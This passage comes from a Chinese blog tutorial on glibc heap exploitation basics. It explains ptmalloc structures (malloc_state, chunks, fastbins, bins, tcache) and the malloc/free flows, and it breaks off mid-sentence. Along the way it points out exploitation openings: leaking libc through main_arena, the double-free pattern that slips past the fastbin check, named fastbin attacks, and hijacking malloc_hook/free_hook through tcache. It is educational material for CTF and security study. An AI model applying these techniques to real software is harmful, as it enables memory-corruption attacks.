<span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">8</span> * number of cores + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>malloc_state是一个结构体，thread arena对应的malloc_state存储在各自本身的arena的_heap_info上方， _heap_info在每个heap的低地址开头.</p><p>main_arena的malloc_state是一个全局变量，在 libc.so 的数据段,偏移固定，所以知道了main_arena的地址就能泄露libc的基址</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/main_arena.jpg" alt="main_arena"></p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/thread_arena.jpg" alt="thread_arena"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<span class="hljs-comment">//用于进程间的互斥，同一个arena同时只能被一个进程访问</span><br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<span class="hljs-comment">//表示arena是否存在fastbin或者内存是否连续等信息</span><br><br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-type">int</span> have_fastchunks;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  <span class="hljs-comment">//一个用来存放所有fastbin链表的数组,最多10个fastbin链表</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<span class="hljs-comment">//指向top chunk</span><br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<span class="hljs-comment">//指向last_remainder</span><br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<span class="hljs-comment">//存放除fastbin的所有bin</span><br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向下一个arena</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><span class="hljs-comment">//指向下一个空闲的arena</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<span class="hljs-comment">//使用本arena的线程的数量</span><br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  <span class="hljs-comment">//分配给本arena的内存范围</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="2-heap-info"><a href="#2-heap-info" class="headerlink" title="2._heap_info"></a>2._heap_info</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span>此堆段属于哪一个arena<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span>指向前一个heap，非主线程的heap通过这个连接起来，串成单向链表<br>  <span class="hljs-type">size_t</span> size;   <span class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p>main_arena没有_heap_info，其存在于thread_arena的每个heap的低地址开头，用于解释说明该heap。</p><h2 id="3-chunk和malloc-chunk"><a href="#3-chunk和malloc-chunk" class="headerlink" title="3.chunk和malloc_chunk"></a>3.chunk和malloc_chunk</h2><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215163401495.png" alt="image-20230215163401495"></p><p>在内存中，prev_size在低地址，bk_nextsize在高地址</p><p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</li><li>size，该 chunk 的大小(包括了chunk_header,即prev_size和size)，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li>fd，bk。chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li><li>fd和bk指向的是prev_size位，是chunk_header,不是usr_data,所以p-&gt;fd-&gt;fd 即 p-&gt;fd - 0x18指向的地址单元内的数据(x64 )</li><li>但是，malloc函数返回的指针是指向usr_data的指针，free的也是这个指针</li></ul></li><li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215160404418.png" alt="image-20230215160404418"></p><p>如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p><ol><li>本身的 size 字段会记录，</li><li>它后面的 chunk 会记录。</li></ol><p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。同时，如果被free的chunk上方是top chunk,则该chunk会和top chunk合并。</p><h2 id="4-fastbinsY"><a href="#4-fastbinsY" class="headerlink" title="4.fastbinsY"></a>4.fastbinsY</h2><p>fastbin有10个数组(bin)，每个数组存放一个单向链表，每个链表存放同一个size的chunk，在进行添加删除操作时使用的是LIFO原则</p><p>题外话：为什么使用LIFO？为什么不直接插在链表尾？因为glibc有的只是fastbins[n]这一个指针和被free的chunk的地址，如果要插到链表尾，则需要沿着链表头一直迭代到链表尾，耗时更长</p><p>fastbin是为了减少小内存的切割和合并，提高效率而存在的。<strong>fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并。</strong>但是当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。malloc_consolidate 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。</p><p>默认情况下，对于size_t为4B的平台， 小于64B的chunk分配请求（最大可以80B，默认56B，即<strong>默认用8个bin</strong>）；对于size_t为8B的平台，小于128B的chunk分配请求(最大可以160B，默认112B)，程序会根据所需的size(<strong>这里指的是数据空间的大小，即去除prev_size和size字段后的大小</strong>)首先到fastbin中去寻找对应大小的bin中是否包含未被使用的chunk，如果有，则直接从bin中返回该chunk。而释放chunk时，也会根据chunk的size参数计算fastbin中对应的index，如果存在对应的大小，就将chunk直接插入对应的bin中。</p><p>tips：<em>32位平台 size_t 长度为 4 字节，64 位平台的 size_t 长度可能是 4 字节，也可能是 8 字节，64 位Linux平台 size_t 长度为 8 字节</em></p><p>32位下，各个fastbin存储的大小为:8,16,24,32,40,48,56,64,72,80</p><p>64位下，各个fastbin存储的大小为:16,32,48,64,80,96,112,128,144,160</p><p>例子：</p><p>在bin中插入chunk时，首先将要插入的chunk的fd修改为此时bin数组中存放的指针值，再将bin数组指向要插入的chunk，我们将bin数组指向的chunk称为链表头，每次插入chunk都插入到链表头，取出chunk也是先从链表头取</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">buff0</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br><span class="hljs-attribute">buff1</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br><span class="hljs-attribute">buff2</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br>free（buff0）<br>free（buff1）<br>free（buff2）<br></code></pre></td></tr></table></figure><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/8854824-a442c2d04218da5f.webp" alt="8854824-a442c2d04218da5f"></p><p>1.malloc申请fastbin范围内的chunk时，会首先在fastbins中查询对应size的链表头是否为空，若不为空，则继续<strong>检查链表头指向的chunk的size位</strong>，没问题则返回给用户。在利用double free时需要特别注意这一点，最后申请到的目标地址并不是任意的，而是需要一个伪造的chunk。顺带一提，fd指向的是chunk_header的首地址，不是usr_data的首地址。</p><p>2.由于fastbin的机制，在满足fastbin的chunk在被释放后它下一个chunk的P位不会被置为0，也就是说即使当前chunk被释放掉了，但是他的next_chunk的P为还依然为1，导致了chunk能被多次释放，这样做是为了防止chunk被合并，提高效率，但成为了造成double free漏洞的因素之一。</p><p>3.对于fastbin中的chunk，在释放时只会对链表头的chunk进行检验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上，释放chunk时会检测该chunk是否是链表头指向的chunk，是则报错</p><p>但是我们可以先free(chunk1)，再free(chunk2),再free(chunk1),这样chunk1就被free了两次，造成了double free漏洞</p><p>针对fastbin的攻击有：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><h2 id="5-bins"><a href="#5-bins" class="headerlink" title="5.bins"></a>5.bins</h2><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215210936982.png" alt="image-20230215210936982"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<span class="hljs-comment">//NBINS = 128，即bins[254]</span><br></code></pre></td></tr></table></figure><ul><li><p>用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</p></li><li><p>malloc_state结构体的成员，每两个bins控制一个双向循环链表，第一个bins为fd，指向链表的头结点，第二个bins为bk，指向链表的尾结点，为了方便起见在这里称两个bins为一个BINS，这里一共有127个BINS。</p></li></ul><p><strong>对于bins中的双向链表，当BIN中只有一个chunk时，fd和bk指针都指向链表头，即一个libc的地址，可以用来泄露libc地址。并且由于chunk在大于fast bin时优先进入unsorted bin，进入small bin和large bin的条件较为苛刻，一般是用unsorted bin，其链表头地址为main_arena+88。比较典型的利用可以参考buu babyheap_0ctf_2017</strong></p><h3 id="1-unsorted-bin"><a href="#1-unsorted-bin" class="headerlink" title="1.unsorted bin"></a>1.unsorted bin</h3><h3 id="BINS-0-（即bins-0-bins-1-）为unsorted-bin，占一个BINS"><a href="#BINS-0-（即bins-0-bins-1-）为unsorted-bin，占一个BINS" class="headerlink" title="BINS[0]（即bins[0],bins[1]）为unsorted bin，占一个BINS"></a>BINS[0]（即bins[0],bins[1]）为unsorted bin，占一个BINS</h3><p><strong>FIFO</strong>，从头部插入，从尾部取出</p><p>&amp;bins[0]  &#x3D; main_arena + 104        &amp;bins[1] &#x3D; main_arena + 112</p><p>无chunk时，bins[0] &#x3D; bins[1] &#x3D; main_arena + 88  </p><p>只有一个chunk时，bins[0]和bins[1]都指向该chunk，该chunk的fd和bk都指向main_arena+88,该地址处存放top_chunk的地址</p><p>有多个chunk时，尾部的chunk的fd指向main_arena + 0x88</p><p>题外话：如果把bins[0]看作一个chunk的fd，bins[1]看作bk，那么main_arena+88就是这个chunk的prev_size</p><h3 id="2-small-bin"><a href="#2-small-bin" class="headerlink" title="2.small bin"></a>2.small bin</h3><h3 id="BINS-2-BINS-63-（即bins-2-bins-125-）为small-bins，占62个BINS"><a href="#BINS-2-BINS-63-（即bins-2-bins-125-）为small-bins，占62个BINS" class="headerlink" title="BINS[2]-BINS[63]（即bins[2]-bins[125]）为small bins，占62个BINS"></a>BINS[2]-BINS[63]（即bins[2]-bins[125]）为small bins，占62个BINS</h3><p>​链表中chunk的大小与index的关系是<em><em>2</em> size_t</em> index**</p><p>​采用<strong>FIFO(先入先出)算法</strong>：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的   rear end(尾端)中获取chunk。</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/201907300808254.png" alt="201907300808254"></p><h3 id="3-large-bin"><a href="#3-large-bin" class="headerlink" title="3.large bin"></a>3.large bin</h3><h3 id="BINS-64-BINS-126-（即bins-126-bins-251-）为large-bins，占63个BINS"><a href="#BINS-64-BINS-126-（即bins-126-bins-251-）为large-bins，占63个BINS" class="headerlink" title="BINS[64]-BINS[126]（即bins[126]-bins[251]）为large bins，占63个BINS"></a>BINS[64]-BINS[126]（即bins[126]-bins[251]）为large bins，占63个BINS</h3><p>​大于等于1024字节（0x400）的chunk称之为large chunk</p><ul><li><p>large bin链表的个数为63个，被分为6组。</p></li><li><p>largechunk使用fd_nextsize、bk_nextsize连接起来。</p></li><li><p>同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中。</p></li><li><p>large chunk可以添加、删除在large bin的任何一个位置。</p></li><li><p>在这63个largebins中：第一组的32个largebin链依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。第二组的16个largebin链依次以512字节步长为间隔；第三组的8个largebin链以步长4096为间隔；第四组的4个largebin链以32768字节为间隔；第五组的2个largebin链以262144字节为间隔；最后一组的largebin链中的chunk大小无限制。</p></li><li><p>在同一个largebin中：每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个largebin中的所有chunk按照chunksize进行从大到小的排列：最大的chunk放在一个链表的front end，最小的chunk放在rear end；相同大小的chunk按照最近使用顺序排序。</p></li></ul><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/20190730154304263.png" alt="20190730154304263"></p><h2 id="6-堆内存释放"><a href="#6-堆内存释放" class="headerlink" title="6.堆内存释放"></a>6.堆内存释放</h2><p>主要流程在_int_free</p><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibcmalloc和free源码解析</a></p><p>（1）根据可用地址获取该地址所在的内存块</p><p> (1.5)各种check，如传入的指向chunk的指针是否16字节对齐(32位下8字节)，size位不能小于MINSIZE，下一个chunk的prev_inuse需要为1</p><p>（2）检查该内存块的大小是否属于 fast chunk范围，若是，则直接放入fast bin；否则（3）<br>（3）检查该内存块标志位M，若为1，则直接使用munmap释放；否则（4）<br>（4）检查相邻的上一个内存块（低地址）是否空闲，若空闲，则合并；<br>（5）检查相邻的下一个内存块是否空闲，若非空闲，则直接加入unsorted bin；若空闲，检查该内存块是否为top chunk，若为top chunk，则合并并修改top chunk的地址和大小；若非top chunk，则合并并添加到unsorted bin<br>（6）对于主Arena，检查top chunk的区域是否超过设定的阈值，若超过，那么就适当地缩减一部分，通过brk将一部分内存还给内核；对于子Arena，则会检查，目前top chunk所在堆的内存是否已经全部释放，若已将全部释放，那就通过munmap将这片内存还给内核。</p><p>可以看出，free内存块一共有4个去向：①放入fast bins ②放入unsorted bin ③合并入top chunk ④直接通过unmap还给内核</p><p>注：主Arena在进行堆的缩减时，首先通过sbrk(0)获取当前的brk的边界，如果brk &#x3D; top起始地址 + top的大小 才会进行缩减，这说明，当top chunk存在于mmap得到的堆时，brk还停留在非mmap得到的堆顶，这就是arena部分所说的这部分内存将永远无法返还给内核的原因。</p><p>堆合并一般思路： </p><p>1.尝试向低地址合并。</p><p>2.尝试向高地址合并，若为topchunk则直接并入topchunk，否则尝试合并后放入unsorted bin</p><h2 id="7-堆内存分配"><a href="#7-堆内存分配" class="headerlink" title="7.堆内存分配"></a>7.堆内存分配</h2><p>主要流程在_int_malloc</p><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibcmalloc和free源码解析</a></p><p><strong>请求的字节数和实际分配的内存大小原则</strong>：</p><p>1.不管是32位还是64位，malloc申请的内存(usr_data+chunk头)都是16字节对齐的</p><p>2.会对下一个chunk的prev_size位进行复用，比如32位下malloc(0x2c),按理来说0x2c+8位chunk头 &gt; 0x30，则chunk_size为0x41，但是由于复用了，chunk_size还是0x31，而malloc(0x2d)，chunk_size就是0x41了</p><p>  所以32位下，glibc2.31（ubuntu1804默认）、2.27,chunk_size &#x3D; malloc_size + 8 - 4     16位向上对齐（即不足16位按16位算）</p><p>  32位下对于   glibc2.23（ubuntu1604默认），chunk_size &#x3D; malloc_size + 8 - 4             8位向上对齐</p><p>  64位下chunk_size &#x3D; malloc_size + 0x10 - 8      16位向上对齐</p><p>  glib中堆内存分配的基本思路就是，首先找到本线程的Arena，然后优先在Arena对应的回收箱中寻找合适大小的内存，在内存箱中所有内存块均小于所需求的大小，那么就会去top chunk分割，但是如果top chunk的大小也不足够，此时不一定要拓展top，检查所需的内存是否大于128k，若大于，则直接使用系统调用mmap分配内存，如果小于，就进行top chunk的拓展，即堆的拓展，拓展完成后，从top chunk中分配内存，剩余部分成为新的top chunk。</p><pre><code class="hljs">1. 检查是否设置了`malloc_hook`，若设置了则跳转进入`malloc_hook`，若未设置则获取当前的分配区，进入`int_malloc`函数。2. 如果当前的分配区为空，则调用`sysmalloc`分配空间，返回指向新`chunk`的指针，否则进入下一步。3. 若用户申请的大小在`fast bin`的范围内，则考虑寻找对应`size`的`fast bin chunk`，判断该`size`的`fast bin`是否为空，不为空则取出第一个`chunk`返回，否则进入下一步。4. 如果用户申请的大小符合`small bin`的范围，则在相应大小的链表中寻找`chunk`，若`small bin`未初始化，则调用`malloc_consolidate`初始化分配器，然后继续下面的步骤，否则寻找对应的`small bin`的链表，如果该`size` 的`small bin`不为空则取出返回，否则继续下面的步骤。如果申请的不在`small bin`的范围那么调用`malloc_consolidate`去合并所有`fast bin`并继续下面的步骤。5. 用户申请的大小符合`large bin`或`small bin`链表为空，开始处理`unsorted bin`链表中的`chunk`。在`unsorted bin`链表中查找符合大小的`chunk`，若用户申请的大小为`small bin`，`unsorted bin`中只有一块chunk并指向`last_remainder`，且`chunk size`的大小大于`size+MINSIZE`，则对当前的`chunk`进行分割，更新分配器中的`last_remainder`，切出的`chunk`返回给用户，剩余的`chunk`回`unsorted bin`。否则进入下一步。6. 将当前的`unsorted bin`中的`chunk`取下，若其`size`恰好为用户申请的`size`，则将`chunk`返回给用户。否则进入下一步7. 获取当前`chunk size`所对应的bins数组中的头指针。（`large bin`需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的chunk的数量大于`MAX_ITERS`则不在处理。进入下一步。8. 如果用户申请的空间的大小符合`large bin`的范围或者对应的small bin链表为空且`unsorted bin`链表中没有符合大小的`chunk`，则在对应的`large bin`链表中查找符合条件的`chunk`（即其大小要大于用户申请的`size`）。若找到相应的`chunk`则对`chunk`进行拆分，返回符合要求的`chunk`（无法拆分时整块返回）。否则进入下一步。9. 根据`binmap`找到表示更大`size`的`large bin`链表，若其中存在空闲的`chunk`，则将`chunk`拆分之后返回符合要求的部分，并更新`last_remainder`。否则进入下一步。10. 若`top_chunk`的大小大于用户申请的空间的大小，则将`top_chunk`拆分，返回符合用户要求的`chunk`，并更新`last_remainder`，否则进入下一步。11. 若`fast bin`不为空，则调用`malloc_consolidate`合并`fast bin`，重新回到第四步再次从`small bin`搜索。否则进入下一步。12. 调用`sysmalloc`分配空间，`free top chunk`返回指向新`chunk`的指针。13. 若`_int_malloc`函数返回的`chunk`指针为空，且当前分配区指针不为空，则再次尝试`_int_malloc`14. 对`chunk`指针进行检查，主要检查`chunk`是否为`mmap`，且位于当前的分配区内。</code></pre><p>  注：<br>  ①small request是指实际分配的内存块大小属于small chunk范围<br>  ②fast bins合并操作是指，检查fast bins中的所有内存块是否可以和相邻内存块合并，若可以合并，则进行合并，并将合并后的内存块加入到unsorted bin中<br>  ③last remainder是一个目的为更好的利用空间局部性的优化！<br>  ④MINSIZE是指一个内存块的最小大小，即 chunk头的前两个字段所占空间<br>  ⑤遍历unsorted bin 是，并不是找到一个大于当前所需的内存块就返回，是因为遵循“small first，best fit”原则，因为可能存在内存更小，内存块用于分配<br>  ⑥找到合适的内存块后，会将内存块从当前链表中移除<br>  ⑦large chunk是否可以分割取决于剩余的大小是否大于MINSIZE<br>  ⑧binmap是一个用于记录bins中各个bin是否存在有内存块的位图，需要注意，位图中若为空，则表示一定不存在；若非空，则可能存在；<br>  ⑨注意到，内存块的分配是按照对齐来的，并且内存块的分割若不成功，则会返回整个内存块，也就是说，我们得到的内存大小实际上可能大于我们所需要的内存大小的。<br>  ⑩直接使用mmap申请的内存会被标记为M，释放时，也会直接走munp释放给内核</p><h2 id="8-tcache-bin"><a href="#8-tcache-bin" class="headerlink" title="8.tcache bin"></a>8.tcache bin</h2><p>全称thread local caching，glibc 2.26开始引入 ，目的是提高效率，但是牺牲了安全性</p><ul><li><p>单链表，LIFO，后进先出，即存取都在链表头，链表指针为fd字段</p></li><li><p>和fastbin一样，不会被合并，inuse位不会置0</p></li><li><p>tcachebin中的链表指针指向的下一个chunk的<code>fd</code>字段，fastbin中的链表指针指向的是下一个chunk的<code>prev_size</code>字段</p></li><li><p>tcache_perthread_struct结构体中的tcache_entry *entries[TCACHE_MAX_BINS];声明了有64个元素的指针数组，即有64个tcache单链表，每相邻两个链表中的chunk大小相差0x10，所以用户数据部分范围(不考虑复用)是0x10-0x400，chunk_size最大0x410，malloc(&lt;&#x3D;0x408)的chunk都在tcache范围内。32位机器上是以8字节递增，即用户数据范围0x8-0x19c,chunk_size最大0x204，malloc(&lt;&#x3D;0x200)的chunk都在范围内。</p></li><li><p>每个单链表中最多存7个chunk</p></li><li><p>在<code>_int_free</code>中，最开始就先检查chunk的size是否落在了tcache的范围内，且对应的tcache未满，将其放入tcache中。</p></li><li><p>在内存申请的开始部分，调用malloc_hook之后，int_malloc之前，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。注：这里没有对size是否符合bin对应的size的验证，可以直接劫持free_hook、malloc_hook、got表等</p><p>在<code>_int_malloc</code>中，</p><p>如果从fastbin中取出了一个块，那么会把该fastbin中剩余的块放入tcache中直至填满tcache（smallbin中也是一样）</p><p>如果进入了unsortedbin，且chunk的size和当前申请的大小精确匹配，那么在tcache未满的情况下会先将其放入到tcachebin中，继续在unsorted 